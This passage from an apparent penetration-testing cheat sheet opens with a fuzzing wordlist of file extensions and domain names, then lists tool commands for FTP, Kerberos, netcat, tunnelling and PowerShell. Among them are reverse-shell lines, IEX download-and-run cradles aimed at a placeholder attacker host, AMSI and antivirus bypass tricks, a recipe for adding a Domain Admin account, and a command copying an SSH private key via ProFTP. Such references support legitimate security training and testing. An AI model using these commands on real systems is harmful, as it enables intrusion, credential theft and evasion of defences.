.meretrizdelujo.com
.messagey.com
.metadata.js
.meus.php
.midi
.milliculture.net
.min_
.miss-video.com
.mk.gutschein
.mk.rabattlp
.mkv
.mmap
.model-escorts.asia
.modelescorts.asia
.mp
.mp3.html
.mq4
.mreply.rc
.msp
.mvn
.mysqli
.napravlenie_ASC
.napravlenie_DESC
.nded-pga-emial
.net-en
.net-print.htm
.net_Backup_Giornaliero
.net_Backup_Settimanale
.new.htm
.newsletter
.nexucom.com
.ninwinter.net
.nl.html
.nonude.org
.nonudes.com
.nth
.nz
.od
.offer.php
.offline
.ogv
.ok
.old.1
.old.htm
.old.old
.old1
.old3
.older
.oliver
.onedigitalcentral.com
.onenettv.com
.online
.opensearch
.org-tov.html
.org.ua-tov.html
.orig.html
.origin.php
.original.html
.orlando-vacationhome.net
.orlando-vacationhomes-pools.com
.orlando-vacationrentals.net
.osg
.outbound
.owen
.ownhometest.co.uk
.pae
.page_pls_all_password
.pages-medicales.com
.pan
.parse-url
.part
.pass
.patch
.paul
.paymethods.php
.pazderski.com
.pazderski.net
.pazderski.us
.pdd
.pdf.html
.pdf.pdf
.pdf.php
.pdfx
.perfect-color-world.com
.petersburg-apartments-for-business.html
.petersburg-apartments-for-tourists.html
.petersburg-romantic-apartments.html
.phdo
.photo
.php--------------
.php.LCK
.php.backup
.php.html
.php.inc
.php.mno
.php.original
.php_
.php_OLD
.php_old
.phphp
.phppar
.phpvreor.php
.php
.pht
.pl.html
.planetcom.ca
.playwithparis.com
.plugins
.png,bmp
.popup
.pornfailures.com
.pornoizlee.tk
.pornz.tv
.posting.prep
.prev
.print.jsp
.prl
.prosdo.com
.psb
.publisher.php
.puresolo.com
.pussyjourney.com
.qtgp
.qxd
.r.
.rabattlp
.rails
.randomocityproductions.com
.rateart.php
.readfile
.rec.html
.redirect.php
.remove
.remove.php
.removed
.resultados
.resume
.rhtm
.riddlesintime.com
.rmvb
.ro
.roma
.roomscity.com
.roshanigunewardene.com
.rpt
.rsp
.rss.php
.rss_cars
.rss_homes
.rss_jobs
.rtfd
.rvt
.s.html
.sadopasion.com
.safariextz
.salestax.php
.sc
.sca-tork.com
.scandir
.scrollTo.js
.search.html
.sec.cfm
.section
.secure
.send
.sent-
.service
.session-regenerate-id
.set
.sex-startje.nl
.sexmeme.com
.sexon.com
.sexy-girls4abo.de
.sfw
.sgf
.shipcode.php
.shipdiscount.php
.show.php
.shtml.html
.sidebar
.sisx
.sitemap.
.skin
.small-penis-humiliation.net
.smiletest.co.uk
.snippet.aspx
.snuffx.com
.sort
.sortirovka_Price.napravlenie_ASC
.sortirovka_Price.napravlenie_DESC
.sortirovka_customers_rating.napravlenie_ASC
.sortirovka_customers_rating.napravlenie_DESC
.sortirovka_name.napravlenie_ASC
.sortirovka_name.napravlenie_DESC
.sp
.sphp3
.srch
.srf
.srvl
.st-patricks.com
.sta
.staged.php
.staging
.start.php
.stat
.stats
.step
.stml
.storebanner.php
.storelogo.php
.storename.php
.sts.php
.suarez
.submit
.support
.support.html
.swf.LCK
.sym
.system
.tab-
.table.html
.tablesorter.min.js
.tablesorter.pager.js
.tatianyc.com
.tb
.tech
.teen-shy.com
.teenhardpussy.com
.temp.php
.templates.php
.temporarily.withdrawn.html
.test.cgi
.test.php
.tf
.tg
.thanks
.thehotfish.com
.theme
.thompson
.thumb.jpg
.ticket.submit
.tim
.tk
.tls
.to
.touch.action
.trace
.tracker.ashx
.trade
.trishasex.viedos.com
.ts
.tst
.tvpi
.txt.txt
.txuri-urdin.com
.ufo
.ugmart.ug
.ui-1.5.2
.unixteacher.org
.unsharp.php
.update
.upgrade
.v1.11.js
.v2.php
.vacationhomes-pools.com
.var
.venetian.com,prod2.venetian.com,reservations.venetian.com,
.verify
.video
.videodeputas.com
.videos-chaudes.com
.viewpage__10
.vmdk
.vn
.voetbalassist.nl
.vs
.vx
.vxlpub
.w3m
.w3x
.wax
.web-teck.com
.webalizer
.webarchive
.webjockey.nl
.webm
.weedooz.eu
.wgx
.wimzi.php
.wireless
.wireless.action
.wm
.woolovers.com
.working
.wpl
.wplus
.wps.rtf
.write.php
.wwsec_app_priv.login
.www.annuaire-vimarty.net
.www.annuaire-web.info
.www.kit-graphik.com
.www.photo-scope.fr
.xcam.at
.xconf
.xcwc.com
.xgi
.xhtml5
.xlt
.xm
.xml.old
.xpdf
.xqy
.xslx
.xst
.xsx
.xy.php
.yp
.ys
.z
.za
.zh.html
.zhtml
.zip.php
```

## find

```c
$ find . -type f
```

### Line Count

```c
$ find . -type f -exec wc -l {} \; | sort -nr
```

### Find not empty Files

```c
$ find results -not -empty -ls
```

### Show Permissions

```c
$ find . -type d -ls
```

## findmnt

```c
$ findmnt
```

## for loop

```c
$ for i in $(seq 0 30); do ssh -i ~/.ssh/id_rsa root@<RHOST>; sleep 1; done
```

### Generate simple List

```c
$ for i in `seq 1 100`; do echo $i; done
```

## FTP

```c
$ ftp <RHOST>
```

### Common Commands

```c
ftp> dir      // lsit all files and directories
ftp> ls -a    // list all files (even hidden) (yes, they could be hidden)
ftp> binary   // set transmission to binary instead of ascii
ftp> ascii    // set transmission to ascii instead of binary
ftp> bye      // exit
```

### Anonymous Login

```c
Username: anonymous
Password: anonymous
```

### Browser Connection

```c
ftp://anonymous:anonymous@<RHOST>
```

### Passive Mode

```c
$ ftp -p <RHOST>    // passive mode for firewall evasion
```

### Download all files from FTP

```c
$ wget -r ftp://anonymous:anonymous@<RHOST>
$ wget -m ftp://anonymous:anonymous@<RHOST>
$ wget -m --no-passive ftp://anonymous:anonymous@<RHOST>
```

### Scan for detailed Output

```c
$ nmap -sC -sV -p 21 -vvv <RHOST>
```

### Fixing 229 Entering Extended Passive Mode

```c
ftp> passive
```

## getent

```c
$ getent passwd
```

## getfacl

### Read ACL Permissions

```c
$ getfacl <DIRECTORY>
```

## gin

> https://github.com/sbp/gin

```c
$ ./gin /PATH/TO/REPOSITORY
```

## Git

```c
$ git show-branch
$ git log <BRANCH> --oneline
$ git show <COMMIT>
```

## glab

```c
$ glab auth login
```

## Go

### How to update Go

> https://gist.github.com/nikhita/432436d570b89cab172dcf2894465753

> https://go.dev/doc/install#install

> https://go.dev/dl/

```c
$ sudo rm -rf /usr/local/go
$ sudo tar -C /usr/local -xzf /PATH/TO/FILE/go1.21.3.linux-amd64.tar.gz
$ echo $PATH | grep "/usr/local/go/bin"
```

### Environment Variables

```c
$ export PATH=$PATH:/usr/local/go/bin
$ export GO111MODULE=on
```

```c
$ export GOROOT=/usr/local/go
$ export GOPATH=$HOME/go
$ export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
```

## grep

```c
$ grep -v                        // remove string from output
$ grep -Hnri <FILE> * | vim -    // pipe output into a new vim buffer
$ grep "$_" * | grep -v "_SERVER\|_SESSION"    // \| equals "or" in grep
```

```c
$ grep -oP '<UNWANTED>\K<OUTPUT-THIS>(?=UNWANTED)'
```

or

```c
$ grep -oP '".*php"'
```

#### Explanation

* -P matching Perl-compatible regular expressions (PCREs)
* -o only output the match, not entire line
* \K ignore everything on left from here
* (?=) ignore everything in here

#### Example

```c
echo 'aaaaabbbbbccccc' | grep -Po 'a+\Kb+(?=c+)'
bbbbb
```

### Search for IPv4 Addresses

```c
$ grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"
```

### Extended Seach

```c
$ grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b|<search_parameter_2>"
```

### Enumerate JavaScript Files

```c
$ curl http://<DOMAIN>/js/chunk-vendors~03631906.67e21e66.js | grep -oP '/api/[^"]*'
```

## grpc

```c
$ pip3 install grpc
$ pip3 install grpc-tools
```

### Skeleton File Structure

```c
syntax = "proto3";

message Content {
	    string data = 1;
}

message Data {
	    string feed = 1;
}

service Print {
	    rpc Feed(Content) return (Data) {}
}

$ python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. file.proto
```

## host

```c
$ host <RHOST>
$ host <DOMAIN>
$ host -l <DOMAIN> <RHOST>
```

## icacls

```c
$ icacls <FILE>
```

## IMAP

```c
c1 LOGIN <USERNAME> <PASSWORD>
c2 LIST
```

## IPython

> https://ipython.org/

```c
$ ipython3
```

## Java

### Compiling java.class

```c
$ javac <FILE>.java
$ javac -d . <FILE>.java
```

### Install Java 8

> https://www.java.com/de/download/manual.jsp

```c
$ sudo cp -R jre1.8.0_381 /usr/lib/jvm/
```

```c
$ cat /etc/environment
# START KALI-DEFAULTS CONFIG
# Everything from here and until STOP KALI-DEFAULTS CONFIG
# was installed by the kali-defaults package, and it will
# be removed if ever the kali-defaults package is removed.
# If you want to disable a line, please do NOT remove it,
# as it would be added back when kali-defaults is upgraded.
# Instead, comment the line out, and your change will be
# preserved across upgrades.
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/jvm/jdk1.8.0_321/bin:/usr/lib/jvm/jdk1.8.0_321/db/bin:/usr/lib/jvm/jdk1.8.0_321/jre/bin
COMMAND_NOT_FOUND_INSTALL_PROMPT=1
POWERSHELL_UPDATECHECK=Off
POWERSHELL_TELEMETRY_OPTOUT=1
DOTNET_CLI_TELEMETRY_OPTOUT=1
# STOP KALI-DEFAULTS CONFIG
```

```c
$ sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jre1.8.0_381/bin/java" 0
```

```c
$ sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jre1.8.0_381/bin/javac" 0
```

```c
$ sudo update-alternatives --set java /usr/lib/jvm/jre1.8.0_381/bin/java
```

```c
$ sudo update-alternatives --set java /usr/lib/jvm/jre1.8.0_381/bin/javac
```

```c
$ sudo update-alternatives --config java
```

## Kerberos

### Ticket Handling with krb5

#### Installation

```c
$ sudo apt-get install krb5-kdc
```

#### Request Ticket with Impacket

```c
$ impacket-getTGT <DOMAIN>/<USERNAME>:'<PASSWORD>'
```

#### Ticket Export

```c
$ export KRB5CCNAME=<FILE>.ccache
$ export KRB5CCNAME='realpath <FILE>.ccache'
```

#### Common Information & Commands

```c
/etc/krb5.conf                   // kerberos configuration file location
kinit <USERNAME>                 // creating ticket request
klist                            // show available kerberos tickets
kdestroy                         // delete cached kerberos tickets
.k5login                         // resides kerberos principals for login (place in home directory)
krb5.keytab                      // "key table" file for one or more principals
kadmin                           // kerberos administration console
add_principal <EMAIL>            // add a new user to a keytab file
ksu                              // executes a command with kerberos authentication
klist -k /etc/krb5.keytab        // lists keytab file
kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the keytab file
```

### Debug

```c
KRB5_TRACE=/dev/stdout kinit -X X509_user_identity=FILE:admin.cer,admin.key Administrator@<DOMAIN>
```

### Fix Error Message ldap3.core.exceptions.LDAPPackageUnavailableError: package gssapi (or winkerberos) missing

```c
$ sudo apt-get install heimdal-dev
```

## ldd

```c
$ ldd /bin/ls
```

## less

### Disable Line Wrapping

```c
$ | less -s
```

## lftp

```c
$ lftp <RHOST> 21
$ set ftp:ssl-force true
$ set ssl:verify-certificate no
$ user <USERNAME>
$ ls
```

## Ligolo-ng

> https://github.com/nicocha30/ligolo-ng

### Download Proxy and Agent

```c
$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
```

### Prepare Tunnel Interface

```c
$ sudo ip tuntap add user $(whoami) mode tun ligolo
```

```c
$ sudo ip link set ligolo up
```

### Setup Proxy on Attacker Machine

```c
$ ./proxy -laddr <LHOST>:443 -selfcert
```

### Setup Agent on Target Machine

```c
$ ./agent -connect <LHOST>:443 -ignore-cert
```

### Session

```c
ligolo-ng » session
```

```c
[Agent : user@target] » ifconfig
```

```c
$ sudo ip r add 172.16.1.0/24 dev ligolo
```

```c
[Agent : user@target] » start
```

## Linux

### User Management

#### Change Username

```c
$ passwd root
$ reboot
```

##### Login as root

```c
$ usermod -l <NEW_USERNAME> -d /home/<NEW_USERNAME> -m <OLD_USERNAME>
$ groupmod -n <NEW_USERNAME> <OLD_USERNAME>
$ ln -s /home/<NEW_USERNAME> /home/<OLDUSERNAME>
```

###### Optional: Change Display Name

```c
$ chfn -f "GIVENNAME SURNAME" <NEW_USERNAME>
```

#### User Profile Files for Execution on Login

```c
.bashrc
.profile
.bash_profile
```

### System Commands

```c
$ last -a
$ cat /etc/issue
$ cat /etc/*release*
$ cat /proc/version
$ sudo -l    // sudo possibilities
```

### Network Commands

```c
$ watch ss -tp
$ netstat -ant
$ netstat -tulpn
$ lsof -i
$ ss -tupn
$ ss -tulpn
$ ping -c 1 <RHOST>
```

### Processes

```c
$ ps -auxf
```

or

```c
$ ps -eaf
$ ss -anp <PROCESS_ID>
$ cd /proc/<PROCESS_ID>
$ ls -la | grep cwd
```

## Logfiles

### Check for User Activity

```c
$ cd /var/log/apache2
$ grep <RHOST> access.log
```

## Logging

Add them to either the `.bashrc` or to the `.zshrc`.

### Bash: local IP address

```c
PS1="[`date  +"%Y-%m-%d %H:%M"`]\[\033[01;31m\] `ip a | grep -A 1 eth0 | grep inet | awk '{ print $2 }' | cut -d '/' -f 1`\[\033[00m\] \[\033[01;34m\]\w\[\033[00m\] \$ "
```

### Bash: external IP address

```c
PS1='[`date  +"%Y-%m-%d %H:%M"`]\[\033[01;31m\] `curl -s ifconfig.co`\[\033[00m\] \[\033[01;34m\]\w\[\033[00m\] \$ '
```

### ZSH: local IP address

```c
PS1="[20%D %T] %B%F{red}$(ip a | grep -A 1 eth0 | grep inet | awk '{ print $2 }' | cut -d '/' -f 1)%f%b %B%F{blue}%1~%f%b $ "
```

### ZSH: external IP address

```c
PS1="[20%D %T] %B%F{red}$(curl -s ifconfig.co)%f%b %B%F{blue}%1~%f%b $ "
```

### ZSH: Kali Prompt with local IP address

```c
PROMPT="%F{white,bold}%W %* $(ip a | grep -A 1 eth0 | grep inet | awk '{ print $2 }' | cut -d '/' -f 1)"$'%F{%(#.blue.green)}\n┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n'$prompt_symbol$'%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]\n└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset} '
```

### PowerShell

For `PowerShell` paste it into the open terminal.

```c
$IPv4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address; function prompt{ "PS" + " [$(Get-Date)] $IPv4> $(get-location) " }
```

## Microsoft Windows

### Ping

```c
C:\> ping -n 1 <RHOST>
```

### Set Environment Variables

```c
C:\> sysdm.cpl
```

### Hide a File

```c
C:\> attrib +h <FILE>
```

### Command Format for PowerShell

```c
$ echo "<COMMAND>" | iconv -t UTF-16LE | base64 -w 0
$ echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
$ iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
```

### New Line

`Ctrl+v+m`

#### File Cleanup

```c
$ sed -i -e "s/^M//" <FILE>
```

## mkpasswd

```c
$ mkpasswd -m sha-512 <PASSWORD>
```

## mp64

### Create Custom Charset

```c
$ mp64 --custom-charset1=?l?u?d{}_ $pass?1$wildcard
```

## msg

### Converting .msg-Files to .eml-Files

```c
$ sudo apt-get install libemail-outlook-message-perl libemail-sender-perl
$ msgconvert *.msg
```

## Nano

```c
:Ex    // exit to folder structure
:w!    // write content to a specific file
:e!    // exit
```

## nc / Ncat / netcat

### Common Commands

```c
$ nc <RHOST> <RPORT>
$ nc -lvpn <LPORT>
```

### Port Scanning

```c
$ nc -nvv -w 1 -z <RHOSTS> <RPORT>-<RPORT>      // TCP
$ nc -nv -u -z -w 1 <RHOSTS> <RPORT>-<RPORT>    // UDP
```

### Ncat with SSL

```c
$ ncat --ssl -lnvp <LPORT>
```

### UDP Listener

```c
$ nc -u <RHOST> <RPORT>
$ nc -u -lnvp <LPORT>
```

or

```c
$ nc -lnvup <LPORT>
```

### File Transfer

#### Listener

```c
$ nc -lnvp <LPORT> > <FILE>
```

#### Remote System

```c
$ nc -w 5 <RHOST> <RPORT> < /PATH/TO/FILE/<FILE>
```

#### Execute powershell.exe

```c
C:\temp\nc64.exe <RHOST> <RPORT> -e powershell.exe
```

### Scanning

```c
$ nc -zv <RHOST> <RPORT>
```

### Execute Shell Commands

```c
$ nc -nvlkp <LPORT> -c "cat /PATH/TO/FILE/<FILE>"
```

## Network File System (NFS)

```c
$ sudo useradd <USERNAME>
$ sudo usermod -u <ID> <USERNAME>
$ sudo su <USERNAME>
```

## NetworkManager

```c
$ sudo systemctl start NetworkManager
$ sudo systemctl stop NetworkManager
$ systemctl status NetworkManager
```

## NFS

```c
$ sudo useradd <USERNAME>
$ sudo usermod -u <ID> <USERNAME>
$ sudo su <USERNAME>
```

## nfsshell

```c
$ sudo apt-get install libreadline-dev libncurses5-dev
$ cd nfsshell
$ make
$ ./nfsshell
```

```c
$ sudo ./nfsshell <RHOST>
nfs> host <RHOST>
Using a privileged port (1023)
Open <RHOST> (<RHOST>) TCP
nfs> export
Export list for <RHOST>:
/home                    everyone
nfs> mount /home
Using a privileged port (1022)
Mount `/home', TCP, transfer size 65536 bytes.
nfs> uid 1000
nfs> gid 1000
nfs> cd <USERNAME>
nfs> ls
```

## npx

### Unpacking .asar-Files

```c
$ npx asar extract <FILE>.asar /PATH/TO/FOLDER/
```

## nsupdate

### Zone Update

```c
$ nsupdate -k key
> server <RHOST>
> zone <DOMAIN>
> update add <DOMAIN> 86400 A <LHOST>
> send
> quit
```

### Read Commands from File

```c
nsupdate -k < <FILE>
```

## objectdump

### Check Binary Files

```c
$ objdump -D /lib/x86_64-linux-gnu/security/pam_unix.so | less
```

## OpenBSD

### Switch User

```c
$ doas -u <USERNAME> /bin/sh
```

### Decrypt .enc-Files

```c
$ netpgp --decrypt <FILE>.tar.gz.enc --output=/PATH/TO/FILE/<FILE>.tar.gz
```

## Outlook

### Staring Outlook without a profile

```c
Ctrl + r
outlook.exe /PIM NoEmail
Enter
```

## paste

### Example

```c
$ cat <file>
user1
text1
user2
text2
user3
text3
```

### Usage

```c
$ paste - - d, < <file>
user1,text1
user2,text2
user3,text3
```

## Perl

### Command Execution

```c
$ sudo /usr/bin/perl -e 'exec "cat /root/root.txt"'
```

## PHP

### Interactive Shell

```c
$ php -a
```

### Perl HTTP Server

Important Note: Every Script there get's executed!

```c
$ sudo php -S 127.0.0.1:80
```

## pipenv

```c
$ pipenv shell
```

## plink

### Remote Port Forwarding

```c
C:\> plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:<RPORT>:127.0.0.1:3389 <LHOST>
```

## PNG

### Fix .png-File Header

```c
$ printf '\x89\x50\x4e\x47' | dd conv=notrunc of=8.png bs=1
```

## POP3

```c
USER <USERNAME>
PASS <PASSWORD>
STAT
LIST
RETR <NUMBER>
```

## PowerShell

### Installation

#### Installation on Linux

```c
$ sudo apt-get install gss-ntlmssp
$ sudo apt-get install powershell
```

### Abbreviations

```c
ipmo    // Import-Module
-wi     // WindowStyle Hidden
```

### General Usage

```c
PS C:\> Get-Help <COMMAND>
```

#### Search for Files

```c
PS C:\> type <FILE> | findstr /l <STRING>
```

#### Create Base64 Blob of a File

```c
PS C:\> [convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
```

#### Import Module to PowerShell cmdlet

```c
PS C:\> Import-Module .\<FILE>
```

#### Create a .zip File

```c
PS C:\> Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
```

#### Unzip a File

```c
PS C:\> Expand-Archive -Force <FILE>.zip
```

#### Start a new Process

```c
PS C:\> Start-Process -FilePath "C:\nc64.exe" -ArgumentList "<LHOST> <LPORT> -e powershell"
```

#### Check PowerShell Versions

```c
PS C:\> Set-ExecutionPolicy Unrestricted
PS C:\> powershell -Command "$PSVersionTable.PSVersion"
PS C:\> powershell -c "[Environment]::Is64BitProcess"
```

#### Check Execution Policy

```c
PS C:\> Get-ExecutionPolicy
```

##### Allow Script Execution

```c
PS C:\> Set-ExecutionPolicy remotesigned
PS C:\> Set-ExecutionPolicy unrestricted
PS C:\> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
```

##### Script Execution Bypass

```c
PS C:\> powershell -ex bypass -File <FILE>.ps1
PS C:\> powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
```

### Invoke-Expression / Invoke-WebRequest

```c
PS C:\> IEX(IWR http://<LHOST>/<FILE>.ps1)
PS C:\> Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)
```

### .NET Reflection

```c
PS C:\> $bytes = (Invoke-WebRequest "http://<LHOST>/<FILE>.exe" -UseBasicParsing ).Content
PS C:\> $assembly = [System.Reflection.Assembly]::Load($bytes)
PS C:\> $entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
PS C:\> $entryPointMethod.Invoke($null, (, [string[]] ('find', '/<COMMAND>')))
```

### PSCredential

```c
Import-CliXml
Export-CliXml
```

### Start offsec Session

```c
PS /home/<USERNAME>> $offsec_session = New-PSSession -ComputerName <RHOST> -Authentication Negotiate -Credential <USERNAME>
PS /home/<USERNAME>> Enter-PSSession $offsec_session
```

### Execute Command as another User

```c
PS C:\> $SecurePassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('<USERNAME>', $SecurePassword)
PS C:\> $Session = New-PSSession -Credential $Cred
PS C:\> Invoke-Command -Session $session -scriptblock { whoami }
```

or

```c
PS C:\> $username = '<USERNAME>'
PS C:\> $password = '<PASSWORD>'
PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
PS C:\> Start-Process powershell.exe -Credential $credential
```

```c
PS C:\> powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
```

### Decryption

```c
PS C:\> $key = Get-Content ".\<FILE>"
PS C:\> $pass = (Get-Content ".\<FILE>" | ConvertTo-SecureString -Key $key)
PS C:\> $secret = (New-Object PSCredential 0, $pass).GetNetworkCredential().Password
PS C:\> echo $secret
```

### Scheduled Tasks

```c
PS C:\> Start-Job -ScriptBlock { C:\Windows\Tasks\<FILE>.exe }
```

### AntiVirus Handling

#### AntiVirus Bypass for Invoke-Expression (IEX)

```c
PS C:\> <COMMAND> | & ( $PsHOme[4]+$PShoMe[30]+'x')
```

##### Explaination

```c
$PSHome[4]     // equals "i"
$PSHome[30]    // equals "e"
+x             // adds an "x"
```

#### Alternative

```c
PS C:\> $eNV:COmSPeC[4,15,25]-JOiN''
```

##### Explaination

```c
$eNV:COmSPeC[4]     // equals "i"
$eNV:COmSPeC[15]    // equals "e"
$eNV:COmSPeC[25}    // equals "x"
```

#### Alternative

#### Test String

```c
PS C:\> $str = 'amsiinitfailed'
```

#### AMSI Bypass

```c
PS C:\> $str = 'ams' + 'ii' + 'nitf' + 'ailed'
```

### System

#### Show current User

```c
PS C:\> whoami /all
PS C:\> getuserid
```

#### Show Groups

```c
PS C:\> whoami /groups
```

#### Get System Information

```c
PS C:\> systeminfo
```

#### Get Process List

```c
PS C:\> Get-Process
```

#### Get net user Information

```c
PS C:\> net users
PS C:\> net users <USERNAME>
```

#### Get User List

```c
PS C:\> Get-ADUser -Filter * -SearchBase "DC=<DOMAIN>,DC=LOCAL"
```

#### Invoke-Expression File Transfer

```c
PS C:\> IEX(IWR http://<LHOST>/<FILE>.ps1) -UseBasicParsing)
```

#### Add new Domain Administrator

```c
PS C:\> $PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <PASSWORD>
PS C:\> New-ADUser -Name "<USERNAME>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
PS C:\> Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
```

#### Execute Commands in User Context

```c
PS C:\> $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlaintext -Force
PS C:\> $cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)
PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}
```

#### Execute Scripts with Credentials (Reverse Shell)

```c
PS C:\> $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
PS C:\> $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
PS C:\> Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
```

#### New-PSSession

```c
PS C:\Users\<USERNAME>\Downloads\backups> $username = "<DOMAIN>\<USERNAME>"
$username = "<DOMAIN>\<USERNAME>"
PS C:\Users\<USERNAME>\Downloads\backups> $password = "<PASSWORD>"
$password = "<PASSWORD>"
PS C:\Users\<USERNAME>\Downloads\backups> $secstr = New-Object -TypeName System.Security.SecureString
$secstr = New-Object -TypeName System.Security.SecureString
PS C:\Users\<USERNAME>\Downloads\backups> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\Users\<USERNAME>\Downloads\backups> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
PS C:\Users\<USERNAME>\Downloads\backups> new-pssession -computername . -credential $cred
new-pssession -computername . -credential $cred

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          localhost       RemoteMachine   Opened        Microsoft.PowerShell     Available

PS C:\Users\<USERNAME>\Downloads\backups> enter-pssession 1
enter-pssession 1
[localhost]: PS C:\Users\<USERNAME>\Documents> whoami
whoami
<DOMAIN>\<USERNAME>
```

### Network

#### Check Port Status

```c
PS C:\> Test-NetConnection <RHOST> -p <RPORT>
```

#### Connect to Azure

```c
PS C:\> Azure-ADConnect -server 127.0.0.1 -db ADSync
```

### File Handling

#### Out-Default

```c
PS C:\> &{ <COMMAND> }
```

#### Read a File

```c
PS C:\> Get-Content <FILE>
```

#### Show hidden Files

```c
PS C:\> Get-ChildItem . -Force
```

or

```c
PS C:\> GCI -hidden
```

#### Convert a File into Base64

```c
PS C:\> [convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
```

#### Directory Listing

```c
PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {ls 'C:\PATH\TO\DIRECTORY\'}
```

#### Write to a File

```c
PS C:\> Invoke-Command -ComputerName <COMPUTERNAME> -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'C:\PATH\TO\FILE\<FILE>' -Value '<CONTENT>'}
```

#### Move a File

```c
PS C:\> move-item -path C:\PATH\TO\FILE<FILE> -destination C:\PATH\TO\DESTINATION
```

#### Create a .zip-File

```c
PS C:\> Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
```

#### Replace Text in File

```c
PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -ScriptBlock{((cat "C:\PATH\TO\FILE\<FILE>" -Raw) -replace '<TO_REPLACE>','cmd.exe /c <NEW_TEXT>') | set-content -path C:\PATH\TO\FILE\<FILE>} -credential $cred
```

#### File Transfer

```c
PS C:\> &{ iwr -uri http://<LHOST>/<FILE>.exe -o 'C:\PATH\TO\DIRECTORY\<FILE>.exe'}
```

#### Read PowerShell History

```c
PS C:\> type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

#### Read .lnk-Files

```c
PS C:\> $WScript = New-Object -ComObject WScript.Shell
PS C:\> $shortcut = Get-ChildItem *.lnk
PS C:\> $WScript.CreateShortcut($shortcut)
```

## printf

```c
$ printf '<LINE1>\n<LINE2>'
```

## proc

### Working Directory

```c
$ ls -l /proc/self/cwd
```

### Log File Read

```c
$ cat /proc/self/fd/10
```

## ProFTP

```c
$ SITE CPFR /home/<USERNAME>/.ssh/id_rsa
$ SITE CPTO /var/tmp/id_rsa
```

## ProFTPD

### Add User to Database

```c
$ echo {md5}`echo -n <PASSWORD> | openssl dgst -binary -md5 | openssl enc -base64`
```

```c
mysql> INSERT INTO ftpuser (id, userid, passwd, uid, gid, homedir, shell, count, accessed, modified) VALUES ('2', '<USERNAME>', '{md5}X03MO1qnZdYdgyfeuILPmQ==', '1000', '1000', '/', '/bin/bash', '0', '2022-09-27 05:26:29', '2022-09-27 05:26:29');
```

## Python2

> https://pip.pypa.io/en/latest/development/release-process/#python-2-support

> https://github.com/pypa/get-pip

```c
$ curl https://bootstrap.pypa.io/get-pip.py | python
```

## Python

### Python HTTP Server

```c
$ python -m SimpleHTTPServer 80
$ python3 -m http.server 80
```

### Python SMTP Server

```c
$ python3 -m smtpd -c DebuggingServer -n <LHOST>:25
```

### Unzip .zip File

```c
$ import zipfile;zipfile.ZipFile('<FILE>.zip','r').extractall('.');
```

### Script Conversion

```c
$ 2to3 <OLD_PYTHON_SCRIPT>.py -w <NEW_PYTHON_SCRIPT>.py
$ 2to3-2.7 <OLD_PYTHON_SCRIPT>.py -w <NEW_PYTHON_SCRIPT>.py
```

